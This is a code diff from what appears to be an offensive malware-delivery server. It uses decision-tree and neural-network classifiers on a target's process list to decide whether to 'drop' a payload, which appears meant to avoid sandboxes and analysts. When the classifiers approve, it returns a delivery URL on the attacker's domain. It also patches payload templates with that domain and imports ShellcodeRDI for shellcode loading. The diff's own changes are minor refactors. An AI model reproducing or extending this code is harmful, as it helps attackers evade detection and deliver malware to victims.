@@ -6,7 +6,7 @@ from collections import namedtuple
 
 from core import config
 from core import logging
-from core import ddmodels
+from core import models
 
 from core.utils import ShellcodeRDI
 
@@ -30,12 +30,10 @@ def process_callback(callback):
         keycodes['keycode'].append(keycode)
 
         url = f'http://{config.domain}/deliver/{keycode}'
-
         return url
 
     else:
         logging.warn(f'Not dropping payload.\n [-]Decision Tree:{decision_tree_prediction}\n [-] Neural Network:{neural_network_prediction}')
-        
         return 'Safety first'
 
 def parse_process_list(process_list):
@@ -92,15 +90,15 @@ def gather_features(parsed_process_list):
     return features
 
 def make_prediction(features):
-    decision_tree_prediction = ddmodels.decision_tree.predict(numpy.asarray(features))[0]
-    neural_network_prediction = ddmodels.neural_network.predict(features)[0]
+    features = numpy.array(features)
+    decision_tree_prediction = models.decision_tree_clf.predict(features)
+    neural_network_prediction = models.neural_network_clf.predict(features)
 
     return decision_tree_prediction, neural_network_prediction
 
 def patch_payloads(payload_files, domain):
     for pfile in payload_files:
         new_payload = open(payload_files[pfile], 'r').read().replace('**server**', config.domain)
-
         new_payload_file = f'{config.basedir}\\payloads\\{config.domain}.{pfile}'
         
         with open(new_payload_file, 'w') as f:
